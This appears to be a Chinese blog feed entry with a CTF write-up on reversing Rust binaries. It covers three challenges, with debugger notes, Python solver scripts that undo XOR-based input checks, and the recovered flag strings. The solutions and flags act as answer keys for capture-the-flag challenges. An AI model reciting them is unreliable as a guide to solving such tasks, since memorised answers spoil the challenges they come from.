    <content type="html"><![CDATA[<h1 id="rust逆向初探初探初探"><a href="#rust逆向初探初探初探" class="headerlink" title="rust逆向初探初探初探"></a>rust逆向初探初探初探</h1><p>&emsp;Starctf有一道SIMPLEX-WMM，和rust有关，看了两天wp没看出来，我真是操了。于是，无情的博客搬运机器，又来了。题目链接如下：<a href="https://github.com/WD-2711/re_files/tree/main/rust-rrrre">链接</a>。</p><span id="more"></span><p>&emsp;Rust的配置与安装见<a href="https://wsxk.github.io/Rust%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/">链接1</a>。</p><h2 id="0x00-beginner：属于菜鸟的rust"><a href="#0x00-beginner：属于菜鸟的rust" class="headerlink" title="0x00 beginner：属于菜鸟的rust"></a>0x00 beginner：属于菜鸟的rust</h2><p><img src="/images/rust-rrrre/image-20230905110015442.png" alt="image-20230905110015442" style="zoom:67%;" /></p><p>&emsp;一般<code>lea rcx, xxx</code>中的<code>xxx</code>就是main函数。进入主函数中，一般看不出来啥，这是因为编译器自己加了点东西，如下所示：</p><p><img src="/images/rust-rrrre/image-20230905110233161.png" alt="image-20230905110233161" style="zoom:67%;" /></p><p>&emsp;用gdb调试一波。发现触发panic的函数一直向下调用到了<code>read_line</code>。如下所示：</p><p><img src="/images/rust-rrrre/image-20230905140246260.png" alt="image-20230905140246260" style="zoom:67%;" /></p><p>&emsp;发现此时输入的字符串在<code>rsp+8</code>的位置，转为代码后，可以发现是<code>v28</code>（这里有个疑问，<code>rsp</code>不是变化的吗？总之技能get）。如下所示：</p><p><img src="/images/rust-rrrre/image-20230905140644670.png" alt="image-20230905140644670" style="zoom:67%;" /></p><p>&emsp;并发现并未对<code>v28</code>做操作，如下所示：</p><p><img src="/images/rust-rrrre/image-20230905141221823.png" alt="image-20230905141221823" style="zoom:67%;" /></p><p>&emsp;继续向下分析，发现程序把输入中的每个char都变成了4字节。如下所示：</p><p><img src="/images/rust-rrrre/image-20230905143837578.png" alt="image-20230905143837578" style="zoom:67%;" /></p><p>&emsp;接下来，保证每一个字符都小于<code>0x7F</code>，如下所示：</p><p><img src="/images/rust-rrrre/image-20230905144408580.png" alt="image-20230905144408580" style="zoom:67%;" /></p><p>&emsp;之后，发现重点：</p><p><img src="/images/rust-rrrre/image-20230905144701554.png" alt="image-20230905144701554" style="zoom:67%;" /></p><p>&emsp;<code>result</code>要等于22。最后写程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line">addr = <span class="number">0x7FFFF7826000</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>):</span><br><span class="line">    flag.append((idc.get_wide_dword(addr+<span class="number">4</span>*i)&gt;&gt;<span class="number">2</span>)^<span class="number">0xa</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># INS&#123;y0ur_a_r3a1_h4rdc0r3_r3v3rs3r&#125;</span></span><br></pre></td></tr></table></figure><h2 id="0x01-checkin-rs"><a href="#0x01-checkin-rs" class="headerlink" title="0x01 checkin-rs"></a>0x01 checkin-rs</h2><p>&emsp;找main函数，如下：</p><p><img src="/images/rust-rrrre/image-20230905152712996.png" alt="image-20230905152712996" style="zoom:67%;" /></p><p>&emsp;其中有几个比较重要的函数：</p><div class="table-container"><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>std::thread::spawn::xxx</td><td>创建线程</td></tr><tr><td>std::thread::JoinHandle</td><td>将线程加入处理队列</td></tr><tr><td>std::sync::mpsc::Receiver</td><td>主线程接收子线程数据，mpsc是Multiple Producer Single Consumer，就是多个线程发送数据，然后单个线程接收数据</td></tr></tbody></table></div><p>&emsp;继续分析，Receiver函数返回值<code>v12</code>，若此值为1，则输出正确，否则输出错误。</p><p><img src="/images/rust-rrrre/image-20230905164050033.png" alt="image-20230905164050033" style="zoom:67%;" /></p><p>&emsp;经过查询，Sender 或 SyncSender 用于向 Receiver 发送数据。所以查找Sender相关的函数，查找到：<code>sync::mpsc::Sender$LT$T$GT$::send</code>。查找其调用，发现<code>sys_common::backtrace::__rust_begin_short_backtrace</code>。分析此函数。</p><p>&emsp;如下所示，首先对输入进行翻转。</p><p><img src="/images/rust-rrrre/image-20230905175301544.png" alt="image-20230905175301544" style="zoom:67%;" /></p><p>&emsp;之后，对输入进行xor处理。</p><p><img src="/images/rust-rrrre/image-20230905182629815.png" alt="image-20230905182629815" style="zoom:67%;" /></p><p>&emsp;接下来，进行<code>flag^i</code>处理。</p><p><img src="/images/rust-rrrre/image-20230905182732017.png" alt="image-20230905182732017" style="zoom:67%;" /></p><p>&emsp;最后，经过<code>bcmp</code>比较。</p><p><img src="/images/rust-rrrre/image-20230905180435241.png" alt="image-20230905180435241" style="zoom:67%;" /></p><p>&emsp;重点在于，比较的值在哪里获得？这是在Sender的参数a1中。跟踪a1，发现调用此函数的是：<code>/rustc/897e37553bba8b42751c67658967889d11ecd120/library/std/src/thread/mod.rs</code>。</p><p>&emsp;最后，猜测在调用<code>thread::spawn</code>函数时，a1当作参数被传入此函数，如下所示：</p><p><img src="/images/rust-rrrre/image-20230905185840243.png" alt="image-20230905185840243" style="zoom:67%;" /></p><p>&emsp;经过分析，字符串存放位置如下：</p><p><img src="/images/rust-rrrre/image-20230905185939633.png" alt="image-20230905185939633" style="zoom:67%;" /></p><p>&emsp;最终，可写j脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data1 = <span class="string">&quot;7A7D79536279566E726824252223207D&quot;</span></span><br><span class="line">data3 = <span class="string">&quot;7A68786E687F467B7F73767F7A7C4E62&quot;</span></span><br><span class="line">data2 = <span class="string">&quot;R~[PE@]LF\\ZHI^&quot;</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data1)//<span class="number">2</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    d = data1[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    d = <span class="built_in">int</span>(d, <span class="number">16</span>)</span><br><span class="line">    data.append(d)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data3)//<span class="number">2</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    d = data3[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    d = <span class="built_in">int</span>(d, <span class="number">16</span>)</span><br><span class="line">    data.append(d)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data2:</span><br><span class="line">    data.append(<span class="built_in">ord</span>(d))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    i = <span class="built_in">len</span>(data) - i - <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^data[i]), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># secpunk&#123;easy_reverse_checkin_rust_is_fun!!!!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-rvm"><a href="#0x02-rvm" class="headerlink" title="0x02 rvm"></a>0x02 rvm</h2><p>&emsp;2022年鹏城杯，rust+vm。</p><p>&emsp;根据<code>beginner</code>题目中<code>main</code>函数的定位，<code>sub_7C40</code>函数是<code>main</code>函数。发现是<code>while..switch..case..</code>结构。可以动调。</p><p>&emsp;首先，经过分析，总共输入8次内容，每一次输入的代码结构为：</p><p><img src="/images/rust-rrrre/image-20230906102228730.png" alt="image-20230906102228730" style="zoom:67%;" /></p><p>&emsp;调了两天，没搞出来，但是看完了wp，也搞懂了。感觉主要是自己没集中精神看。</p><p>参考链接：</p><p>[1] <a href="https://wsxk.github.io/Rust%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/">https://wsxk.github.io/Rust%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</a></p><p>[2] <a href="https://www.cnblogs.com/Here-is-SG/p/17216822.html">https://www.cnblogs.com/Here-is-SG/p/17216822.html</a></p><p>[3] <a href="https://blog.fullstackpentest.com/a-rust-reverse-writeup.html">https://blog.fullstackpentest.com/a-rust-reverse-writeup.html</a></p><p>[4] <a href="https://www.xunflash.top/archives/rustvm.html">https://www.xunflash.top/archives/rustvm.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;rust逆向初探初探初探&quot;&gt;&lt;a href=&quot;#rust逆向初探初探初探&quot; class=&quot;headerlink&quot; title=&quot;rust逆向初探初探初探&quot;&gt;&lt;/a&gt;rust逆向初探初探初探&lt;/h1&gt;&lt;p&gt;&amp;emsp;Starctf有一道SIMPLEX-WMM，和rust有关，看了两天wp没看出来，我真是操了。于是，无情的博客搬运机器，又来了。题目链接如下：&lt;a href=&quot;https://github.com/WD-2711/re_files/tree/main/rust-rrrre&quot;&gt;链接&lt;/a&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
</feed>
